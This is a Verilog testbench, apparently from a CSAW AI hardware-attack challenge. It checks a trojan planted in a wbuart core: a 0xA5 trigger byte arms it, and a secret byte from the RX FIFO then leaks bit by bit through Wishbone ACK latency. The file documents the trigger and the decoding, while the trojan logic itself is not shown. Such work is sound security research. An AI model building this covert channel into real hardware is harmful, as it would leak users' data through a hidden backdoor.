////////////////////////////////////////////////////////////////////////////////
//
// Filename:    tb_wbuart_trojan.v
//
// Purpose:     Self-checking testbench for the "Covert channel over Wishbone
//              ACK timing" trojan inserted into wbuart.v (CSAW AI HW Attack
//              Challenge 2, HARD).
//
//  Method:
//   - Injection of RX bytes uses the REAL rxuart receiver: the testbench
//     bit-bangs i_uart_rx at the core's native baud (CLOCKS_PER_BAUD = 25,
//     from INITIAL_SETUP = 25, 8N1).  This exercises the genuine RX path so
//     the captured byte really is the RX-FIFO head.
//   - The Wishbone bus is driven directly (pipelined, o_wb_stall == 0).  For
//     each read we assert cyc/stb for one cycle then count clock edges until
//     o_wb_ack, giving the ACK latency.
//   - A secret byte (0x3C) is received first and sits in the RX FIFO.  Then
//     the trigger byte 0xA5 is received (capture & arm).  The trojan latches
//     the FIFO head (0x3C) and arms an 8-symbol emission.
//   - Eight UART_SETUP reads then follow; each ACK latency is measured and
//     decoded MSB-first (latency > baseline => bit 1, else bit 0).  The
//     recovered byte must equal 0x3C.
//   - Baseline latency is measured before the trigger and again after
//     disarm to prove the timing side channel is silent when unarmed.
//
////////////////////////////////////////////////////////////////////////////////
`default_nettype none
`timescale 1ns/1ps

module tb_wbuart_trojan;

	localparam [1:0] UART_SETUP = 2'b00,
			 UART_FIFO  = 2'b01,
			 UART_RXREG = 2'b10,
			 UART_TXREG = 2'b11;

	localparam integer BAUD = 25;	// CLOCKS_PER_BAUD for INITIAL_SETUP=25

	reg		i_clk, i_reset;
	reg		i_wb_cyc, i_wb_stb, i_wb_we;
	reg	[1:0]	i_wb_addr;
	reg	[31:0]	i_wb_data;
	reg	[3:0]	i_wb_sel;
	wire		o_wb_stall, o_wb_ack;
	wire	[31:0]	o_wb_data;

	reg		i_uart_rx, i_cts_n;
	wire		o_uart_tx, o_rts_n;
	wire		o_uart_rx_int, o_uart_tx_int,
			o_uart_rxfifo_int, o_uart_txfifo_int;

	integer		errors;

	wbuart #(.INITIAL_SETUP(31'd25)) dut (
		.i_clk(i_clk), .i_reset(i_reset),
		.i_wb_cyc(i_wb_cyc), .i_wb_stb(i_wb_stb), .i_wb_we(i_wb_we),
		.i_wb_addr(i_wb_addr), .i_wb_data(i_wb_data), .i_wb_sel(i_wb_sel),
		.o_wb_stall(o_wb_stall), .o_wb_ack(o_wb_ack), .o_wb_data(o_wb_data),
		.i_uart_rx(i_uart_rx), .o_uart_tx(o_uart_tx),
		.i_cts_n(i_cts_n), .o_rts_n(o_rts_n),
		.o_uart_rx_int(o_uart_rx_int), .o_uart_tx_int(o_uart_tx_int),
		.o_uart_rxfifo_int(o_uart_rxfifo_int),
		.o_uart_txfifo_int(o_uart_txfifo_int));

	// Clock
	initial i_clk = 1'b0;
	always #5 i_clk = ~i_clk;

	// ---- Tasks ----------------------------------------------------------

	// Measure the ACK latency (edges from the stb-sampled edge to ACK) of a
	// read to a given address.
	task automatic wb_read(input [1:0] addr, output integer lat,
				output [31:0] data);
		integer c;
		begin
			// Use NONBLOCKING assignments and hold i_wb_cyc asserted until
			// the ACK is observed (matching the known-good medium TB).  This
			// avoids a blocking-assignment race with the DUT's registered
			// logic and keeps i_wb_cyc high through the ACK cycle, which the
			// trojan's covert-read pipeline is gated on.
			@(posedge i_clk);
			i_wb_cyc  <= 1'b1;
			i_wb_stb  <= 1'b1;
			i_wb_we   <= 1'b0;
			i_wb_addr <= addr;
			i_wb_sel  <= 4'hf;
			@(posedge i_clk);	// stb sampled on this edge
			i_wb_stb  <= 1'b0;
			c = 0;
			while (!o_wb_ack) begin
				@(posedge i_clk);
				c = c + 1;
			end
			lat  = c;
			data = o_wb_data;
			i_wb_cyc  <= 1'b0;	// drop cyc AFTER the ACK is seen
			@(posedge i_clk);
			@(posedge i_clk);
		end
	endtask

	// Bit-bang one byte into the real rxuart (8N1, LSB first).
	task automatic uart_send(input [7:0] b);
		integer i;
		begin
			// start bit
			i_uart_rx = 1'b0;
			repeat (BAUD) @(posedge i_clk);
			for (i = 0; i < 8; i = i + 1) begin
				i_uart_rx = b[i];
				repeat (BAUD) @(posedge i_clk);
			end
			// stop bit + guard
			i_uart_rx = 1'b1;
			repeat (BAUD*2) @(posedge i_clk);
		end
	endtask

	// ---- Stimulus -------------------------------------------------------
	integer		lat, i;
	integer		baseline, lat_after;
	reg	[31:0]	rdata;
	reg	[7:0]	recovered;
	reg	[7:0]	SECRET;

	initial begin
		errors    = 0;
		SECRET    = 8'h3C;
		i_reset   = 1'b1;
		i_wb_cyc  = 1'b0;
		i_wb_stb  = 1'b0;
		i_wb_we   = 1'b0;
		i_wb_addr = 2'b0;
		i_wb_data = 32'b0;
		i_wb_sel  = 4'h0;
		i_uart_rx = 1'b1;	// UART idle is high
		i_cts_n   = 1'b0;
		repeat (8) @(posedge i_clk);
		i_reset = 1'b0;
		repeat (8) @(posedge i_clk);

		// (a) Baseline latency BEFORE any trigger (unarmed path)
		wb_read(UART_SETUP, baseline, rdata);
		$display("[A] Baseline UART_SETUP read latency = %0d cycles (data=0x%08x)",
			baseline, rdata);
		wb_read(UART_SETUP, lat, rdata);
		if (lat !== baseline) begin
			$display("FAIL: baseline latency not stable (%0d vs %0d)", lat, baseline);
			errors = errors + 1;
		end else
			$display("PASS: baseline latency stable at %0d cycles", baseline);

		// (b) Receive the SECRET byte, then the 0xA5 trigger byte
		// The rxuart requires the line to idle HIGH for > break_condition
		// (= clocks_per_baud<<4 = 400) clocks before it leaves RXU_RESET_IDLE
		// and will accept a start bit.  Hold idle well past that first.
		i_uart_rx = 1'b1;
		repeat (500) @(posedge i_clk);
		$display("[B] Injecting secret byte 0x%02x via real rxuart...", SECRET);
		uart_send(SECRET);
		$display("[B] Injecting trigger/arm byte 0xA5 via real rxuart...");
		uart_send(8'hA5);
		repeat (4) @(posedge i_clk);

		// (c) Eight covert reads to UART_SETUP; decode the leaked byte
		$display("[C] Performing 8 covert UART_SETUP reads, measuring ACK latency:");
		recovered = 8'h00;
		for (i = 0; i < 8; i = i + 1) begin
			wb_read(UART_SETUP, lat, rdata);
			recovered = { recovered[6:0], (lat > baseline) ? 1'b1 : 1'b0 };
			$display("      read %0d: latency=%0d -> bit=%0d", i, lat,
				(lat > baseline) ? 1'b1 : 1'b0);
		end
		$display("[C] Recovered byte = 0x%02x (expected 0x%02x)", recovered, SECRET);
		if (recovered === SECRET)
			$display("PASS: recovered leaked byte matches injected secret");
		else begin
			$display("FAIL: recovered byte mismatch");
			errors = errors + 1;
		end

		// (d) Latency returns to baseline after disarm
		wb_read(UART_SETUP, lat_after, rdata);
		$display("[D] Post-disarm UART_SETUP read latency = %0d cycles", lat_after);
		if (lat_after === baseline)
			$display("PASS: ACK latency returned to baseline after disarm");
		else begin
			$display("FAIL: ACK latency did not return to baseline (%0d vs %0d)",
				lat_after, baseline);
			errors = errors + 1;
		end
		wb_read(UART_SETUP, lat_after, rdata);
		if (lat_after !== baseline) begin
			$display("FAIL: latency still perturbed on 2nd post-disarm read");
			errors = errors + 1;
		end

		// Functional sanity: read the FIFO status and RX register normally
		wb_read(UART_FIFO, lat, rdata);
		$display("[E] UART_FIFO read latency=%0d data=0x%08x (functional, unarmed)",
			lat, rdata);
		if (lat !== baseline) begin
			$display("FAIL: functional read latency perturbed while unarmed");
			errors = errors + 1;
		end

		$display("");
		if (errors == 0)
			$display("*** ALL CHECKS PASSED ***");
		else
			$display("*** %0d CHECK(S) FAILED ***", errors);
		$finish;
	end

	// Safety timeout
	initial begin
		#2000000;
		$display("FAIL: global timeout");
		$finish;
	end

endmodule
`default_nettype wire
